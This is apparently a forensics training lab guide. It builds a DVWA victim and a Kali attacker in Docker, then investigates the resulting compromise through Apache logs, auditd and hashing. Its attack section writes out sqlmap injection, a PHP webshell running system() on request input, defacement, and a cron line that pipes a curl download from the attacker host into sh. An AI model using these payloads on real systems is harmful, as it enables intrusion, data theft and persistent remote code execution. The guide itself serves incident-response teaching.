# Scenario 1 — Apache Web Server Compromise

> **Story.** A small business runs a PHP application behind Apache in a
> Docker container. On Tuesday morning, an alert fires from their
> external monitoring: the homepage is defaced. The CTO calls you.
> You arrive on-shift; the host is still running. **Investigate.**

**Modules used.** `disk-forensics`, `web-recon` (helper),
`linux-forensics` (auditd parsing).

**Estimated demo time.** 35 minutes (10 setup + 10 attack + 15 forensics).

---

## 1. Lab setup

### 1.1 Directory layout

```
docs/scenarios/labs/01-apache/
├── docker-compose.lab.yml      # victim + attacker containers
├── victim/
│   ├── Dockerfile              # Apache + PHP + DVWA
│   └── apache.conf             # logging-friendly config
├── attacker/
│   └── Dockerfile              # Kali-style toolkit (nikto, sqlmap)
└── reset.sh
```

### 1.2 The vulnerable target

`docs/scenarios/labs/01-apache/victim/Dockerfile`:

```dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
        apache2 \
        php libapache2-mod-php php-mysqli php-gd \
        mariadb-server \
        wget unzip ca-certificates \
        auditd \
        curl \
 && rm -rf /var/lib/apt/lists/*

# DVWA — Damn Vulnerable Web Application
RUN wget -qO /tmp/dvwa.zip \
      https://github.com/digininja/DVWA/archive/refs/heads/master.zip \
 && unzip -q /tmp/dvwa.zip -d /var/www/ \
 && mv /var/www/DVWA-master /var/www/html/dvwa \
 && rm /tmp/dvwa.zip \
 && chown -R www-data:www-data /var/www/html

# Pre-configured DVWA settings (security set to LOW for the lab)
RUN cp /var/www/html/dvwa/config/config.inc.php.dist \
       /var/www/html/dvwa/config/config.inc.php \
 && sed -i "s/p@ssw0rd/labpass123/" /var/www/html/dvwa/config/config.inc.php

# Apache logging — verbose by design (we want fingerprints)
COPY apache.conf /etc/apache2/conf-available/forensics.conf
RUN a2enconf forensics

# Audit rules — capture file changes under /var/www/html
RUN echo '-w /var/www/html -p wa -k web_content' >> /etc/audit/rules.d/web.rules

EXPOSE 80
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
CMD ["/entrypoint.sh"]
```

`docs/scenarios/labs/01-apache/victim/apache.conf`:

```apache
# Verbose logging for forensics — captures referer, UA, request body size,
# and full URI including query string. Combined log format + extras.
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\" %D %{X-Forwarded-For}i" forensics
CustomLog ${APACHE_LOG_DIR}/access.log forensics

# Don't log healthchecks
SetEnvIf Request_URI "^/healthz$" dontlog
CustomLog ${APACHE_LOG_DIR}/access.log forensics env=!dontlog
```

`docs/scenarios/labs/01-apache/victim/entrypoint.sh`:

```bash
#!/usr/bin/env bash
set -e
service mariadb start
service auditd start || true   # auditd needs CAP_AUDIT_WRITE
mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'labpass123';"
mysql -e "GRANT ALL ON *.* TO 'dvwa'@'localhost'; FLUSH PRIVILEGES;"
exec apache2ctl -DFOREGROUND
```

### 1.3 The attacker toolkit

`docs/scenarios/labs/01-apache/attacker/Dockerfile`:

```dockerfile
FROM kalilinux/kali-rolling

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
        nikto sqlmap curl wget netcat-openbsd \
        nmap whatweb hydra \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /work
CMD ["bash"]
```

### 1.4 Compose file

`docs/scenarios/labs/01-apache/docker-compose.lab.yml`:

```yaml
services:
  victim:
    build: ./victim
    container_name: victim-apache
    hostname: web01
    networks:
      forensics-net:
        ipv4_address: 172.30.0.10
    ports:
      - "127.0.0.1:8080:80"     # only accessible from localhost
    cap_add:
      - AUDIT_WRITE             # auditd
    volumes:
      - victim-logs:/var/log/apache2
      - victim-audit:/var/log/audit
      - victim-www:/var/www/html

  attacker:
    build: ./attacker
    container_name: attacker-kali
    hostname: kali01
    networks:
      forensics-net:
        ipv4_address: 172.30.0.20
    stdin_open: true
    tty: true
    cap_add:
      - NET_RAW

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    internal: false             # set true to fully isolate
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  victim-logs:
  victim-audit:
  victim-www:
```

### 1.5 Bring it up

```bash
cd docs/scenarios/labs/01-apache
docker compose -f docker-compose.lab.yml up -d --build

# Wait for DVWA to initialise its DB
sleep 10

# Confirm
curl -sI http://127.0.0.1:8080/dvwa/setup.php | head -1
# → HTTP/1.1 200 OK
```

Open `http://127.0.0.1:8080/dvwa/setup.php` in a browser, click
**Create / Reset Database**, then log in with `admin` / `password`.

---

## 2. The attack

> All commands below run inside the `attacker-kali` container:
> ```bash
> docker exec -it attacker-kali bash
> ```

### 2.1 Reconnaissance — Nikto scan

```bash
nikto -h http://172.30.0.10/ -o /tmp/nikto-report.txt
```

This makes ~6 000 HTTP requests with a recognisable user-agent
(`Mozilla/5.00 (Nikto/...)`) — perfect for the analyst to fingerprint
later.

### 2.2 SQL injection via SQLMap

DVWA's "SQL Injection" page is the target. Get a session cookie first:

```bash
# Login once to grab the PHPSESSID
curl -s -c /tmp/cookies.txt \
     -d "username=admin&password=password&Login=Login" \
     http://172.30.0.10/dvwa/login.php > /dev/null

PHPSESSID=$(grep PHPSESSID /tmp/cookies.txt | awk '{print $7}')
echo "session: $PHPSESSID"
```

Set DVWA security to "low" (one HTTP request):

```bash
curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
     "http://172.30.0.10/dvwa/security.php?security=low&seclev_submit=Submit" \
     > /dev/null
```

Now SQLMap:

```bash
sqlmap -u "http://172.30.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=$PHPSESSID; security=low" \
       --batch --dbs --threads=4
```

Then dump the DVWA users table:

```bash
sqlmap -u "http://172.30.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=$PHPSESSID; security=low" \
       --batch -D dvwa -T users --dump
```

You now have password hashes (`5f4dcc3b5aa765d61d8327deb882cf99` →
`password`).

### 2.3 Webshell upload

DVWA "File Upload" with security low — drop a tiny PHP shell:

```bash
cat > /tmp/shell.php <<'EOF'
<?php
if(isset($_REQUEST['c'])) {
    echo "<pre>";
    system($_REQUEST['c']);
    echo "</pre>";
}
?>
EOF

curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
     -F "uploaded=@/tmp/shell.php" \
     -F "Upload=Upload" \
     "http://172.30.0.10/dvwa/vulnerabilities/upload/"
```

Test it:

```bash
curl -s -b "PHPSESSID=$PHPSESSID" \
     "http://172.30.0.10/dvwa/hackable/uploads/shell.php?c=id"
# → <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

### 2.4 Defacement (the symptom that triggered the alert)

```bash
curl -s -b "PHPSESSID=$PHPSESSID" \
     "http://172.30.0.10/dvwa/hackable/uploads/shell.php?c=$(printf '%s' \
        'echo "<h1>Pwned by H4x0r</h1>" > /var/www/html/index.html' | \
        python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))')"
```

### 2.5 Persistence — add an SSH-style backdoor (cosmetic, no real SSH)

```bash
curl -s -b "PHPSESSID=$PHPSESSID" \
     "http://172.30.0.10/dvwa/hackable/uploads/shell.php?c=$(printf '%s' \
        'echo "* * * * * curl http://172.30.0.20/payload | sh" | crontab -u www-data -' | \
        python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))')"
```

The attacker's session ends here. **The investigation begins.**

---

## 3. The investigation

> Now switch to the analyst's terminal and the **forensics-professional**
> container.

### 3.1 Acquire the artefacts

On the host:

```bash
# Create the case directory under the forensics container's evidence mount
mkdir -p forensics-professional/evidence/case-01-apache/{logs,www,audit}

# Apache logs
docker cp victim-apache:/var/log/apache2/. \
          forensics-professional/evidence/case-01-apache/logs/

# Document root snapshot
docker cp victim-apache:/var/www/html/. \
          forensics-professional/evidence/case-01-apache/www/

# Auditd logs (file modifications under /var/www/html)
docker cp victim-apache:/var/log/audit/. \
          forensics-professional/evidence/case-01-apache/audit/

# Hash everything for chain of custody
cd forensics-professional/evidence/case-01-apache
find . -type f -exec sha256sum {} \; > ../case-01-apache.sha256
```

### 3.2 Open the case in the analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

Inside the container:

```bash
mkdir -p /cases/case-01-apache && cd /cases/case-01-apache

# Record the case opening (auditable)
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id":  "INC-2026-001",
    "summary":  "Apache server defacement, suspect SQLi+webshell",
    "analyst":  "sherlock",
    "evidence": "/evidence/case-01-apache/",
}, user="sherlock")
PY
```

### 3.3 Install required modules

```bash
forensics-modules install disk-forensics --only sleuthkit -y
forensics-modules install linux-forensics --only auditd-tools,log-parsers -y
forensics-modules verify
```

### 3.4 Triage — what is in the access log?

```bash
ACCESS=/evidence/case-01-apache/logs/access.log

# Top user-agents
awk -F'"' '{print $6}' "$ACCESS" | sort | uniq -c | sort -rn | head -10

# → Look for "Mozilla/5.00 (Nikto/...)" and "sqlmap/" — the smoking guns
```

Record the finding:

```bash
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("ioc_identified", {
    "case_id":   "INC-2026-001",
    "ioc_type":  "user_agent",
    "value":     "Mozilla/5.00 (Nikto/2.5.0)",
    "evidence":  "access.log line 1-6234",
    "confidence": "high",
})
PY
```

### 3.5 Find the attacker's source IP

```bash
grep -i "nikto\|sqlmap" "$ACCESS" | awk '{print $1}' | sort -u
# → 172.30.0.20
```

### 3.6 Identify the SQLi attempts

SQLMap's payloads are loud: thousands of requests, hundreds of unique
`?id=` values, and signature strings like `AND 4174=4174`.

```bash
# Extract the payloads SQLMap tried
grep '172.30.0.20' "$ACCESS" \
  | grep -oE 'id=[^& ]*' \
  | sort -u | head -20

# Count the attack waves
grep '172.30.0.20' "$ACCESS" \
  | awk '{print substr($4,2,12)}' \
  | uniq -c
```

### 3.7 Discover the webshell

```bash
# Anything new in the upload directory?
ls -la /evidence/case-01-apache/www/dvwa/hackable/uploads/

# Check what's in any .php there
find /evidence/case-01-apache/www -name '*.php' -newer /evidence/case-01-apache/www/dvwa/index.php
```

You'll find `shell.php`. Inspect it:

```bash
cat /evidence/case-01-apache/www/dvwa/hackable/uploads/shell.php
```

Hash it:

```bash
sha256sum /evidence/case-01-apache/www/dvwa/hackable/uploads/shell.php

python3 - <<'PY'
import hashlib
from forensics.audit.logger import log_event
p = "/evidence/case-01-apache/www/dvwa/hackable/uploads/shell.php"
with open(p, "rb") as f:
    h = hashlib.sha256(f.read()).hexdigest()
log_event("malware_artifact_identified", {
    "type": "webshell",
    "path": p,
    "sha256": h,
    "language": "PHP",
})
PY
```

### 3.8 Reconstruct the timeline from auditd

```bash
# auditd logged every write under /var/www/html
ausearch -i -k web_content -if /evidence/case-01-apache/audit/audit.log \
  | head -50
```

Extract just timestamps + paths:

```bash
ausearch -k web_content -if /evidence/case-01-apache/audit/audit.log \
  | awk '/type=PATH/' \
  | grep -oE 'name="[^"]*"' \
  | sort -u
```

### 3.9 Extract every webshell invocation

After the upload, every request to `shell.php` is an active attacker
command.

```bash
grep 'shell.php' "$ACCESS" \
  | awk -F'"' '{ split($2,a," "); print $1, a[2] }' \
  | head
```

Each `?c=...` is a command — URL-decode them:

```bash
grep 'shell.php?c=' "$ACCESS" \
  | grep -oE 'c=[^ &"]*' \
  | sed 's/^c=//' \
  | python3 -c 'import sys, urllib.parse
for line in sys.stdin:
    print(urllib.parse.unquote(line.strip()))'
```

### 3.10 Build the timeline

```bash
mkdir -p /reports/INC-2026-001
cat > /reports/INC-2026-001/timeline.md <<'EOF'
# INC-2026-001 — Apache compromise timeline

| Time (UTC)          | Event                                | Source IP    | Evidence |
|---------------------|--------------------------------------|--------------|----------|
| 2026-XX-XX 09:14:23 | Recon — Nikto scan begins            | 172.30.0.20  | access.log:1 |
| 2026-XX-XX 09:14:48 | Recon — Nikto scan ends (~6k req)    | 172.30.0.20  | access.log:6234 |
| 2026-XX-XX 09:15:02 | Login DVWA admin (cred reuse?)       | 172.30.0.20  | access.log:6300 |
| 2026-XX-XX 09:15:10 | SQLi — sqlmap fingerprint attack     | 172.30.0.20  | access.log:6310-7892 |
| 2026-XX-XX 09:18:45 | DB dump — dvwa.users                 | 172.30.0.20  | access.log:7900 |
| 2026-XX-XX 09:21:08 | shell.php uploaded                   | 172.30.0.20  | audit.log + access.log |
| 2026-XX-XX 09:21:24 | First webshell command: `id`         | 172.30.0.20  | access.log:8000 |
| 2026-XX-XX 09:22:11 | Defacement: index.html overwritten   | www-data     | audit.log key=web_content |
| 2026-XX-XX 09:22:48 | Persistence — crontab modified       | www-data     | webshell payload |
EOF
```

### 3.11 Verify the audit trail

```bash
forensics-audit verify
# → STATUS: VALID

forensics-audit show --event-type ioc_identified
forensics-audit show --event-type malware_artifact_identified
forensics-audit stats
```

Export the chain for handover:

```bash
forensics-audit export \
    --output /reports/INC-2026-001/audit-trail.jsonl \
    --format jsonl

sha256sum /reports/INC-2026-001/audit-trail.jsonl \
    > /reports/INC-2026-001/audit-trail.sha256
```

---

## 4. What to demo (talking points)

The four moments worth highlighting on screen:

1. **The user-agent footprint.** Three lines of `awk` over the access
   log identify Nikto and SQLMap unambiguously. Attackers using
   default tools leave default fingerprints.
2. **Timeline correlation.** auditd's `web_content` key + Apache's
   access log + the webshell's `?c=` parameter all line up to the same
   second. This is the value of having **multiple independent log
   sources**.
3. **The webshell hash recorded into the audit log.** A future
   investigator can look up `malware_artifact_identified` events and
   see exactly which file, when, and what its hash was.
4. **`forensics-audit verify` returning VALID.** Then have a volunteer
   `echo "tampered" >> ./logs/audit.log` and re-run — it now shows
   `STATUS: COMPROMISED`. One byte caught.

---

## 5. Cleanup

```bash
cd docs/scenarios/labs/01-apache
docker compose -f docker-compose.lab.yml down -v

# Remove the evidence (keep audit log; carries the case record)
rm -rf forensics-professional/evidence/case-01-apache
rm -rf forensics-professional/cases/case-01-apache
```

The audit log still holds `case_opened`, `ioc_identified`, and
`malware_artifact_identified` events from this investigation — useful
to demonstrate that the audit trail spans cases.

---

## 6. Extension exercises

- **Detection rule.** Write a Sigma rule that flags Nikto's UA in
  Apache logs. Test it with `sigma convert` against a Splunk backend.
- **Suricata replay.** Capture the attacker's traffic with `tcpdump`
  during the attack, then replay it through Suricata to see whether
  the default ET Open ruleset catches the SQLMap signatures.
- **Defence.** Add `mod_security` with the OWASP CRS to the victim
  image. Re-run the attack. Compare what the access log looks like
  when 90 % of payloads are blocked.
